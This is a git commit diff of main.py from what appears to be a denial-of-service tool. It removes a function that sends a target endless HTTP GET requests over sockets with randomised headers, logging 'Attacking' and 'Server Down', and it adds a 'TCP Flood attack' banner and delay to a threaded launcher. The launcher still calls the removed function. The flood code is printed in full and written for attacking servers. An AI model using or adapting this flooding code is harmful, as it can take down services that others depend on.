a23074779398a4da34c17a9fc3d0e143a489f3f8
NSTIOM <144339591+NSTIOM@users.noreply.github.com>
2023-09-14 18:50:21 +0700

    main.py

--- main.py
+++ main.py
@@ -197,32 +197,9 @@ def scan_ip(ip):
     print(f'Scanning IP: {ip}')
     scan_ports(ip)
 
-def start(ip, port, pack, threads):
-    print("Starting attack with threads:", threads)  # เพิ่มบรรทัดนี้
-    global useragents, ref, acceptall
-    hh = random._urandom(3016)
-    xx = int(0)
-    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(ip), int(port)))
-            s.send(str.encode(main_req))
-            for i in range(pack):
-                s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
-            s.close()
-            print('[+] Server Down.')
-
 def start2(ip, port, pack, threads):
+    print("Starting TCP Flood attack on", ip, "at port", port, "at Packets Per Second", pack, "and Threads",threads,"in 3 Second" "...")
+    sleep(3)
     for x in range(threads):
         thred = threading.Thread(target=start, args=(ip, port, pack))
         thred.start()
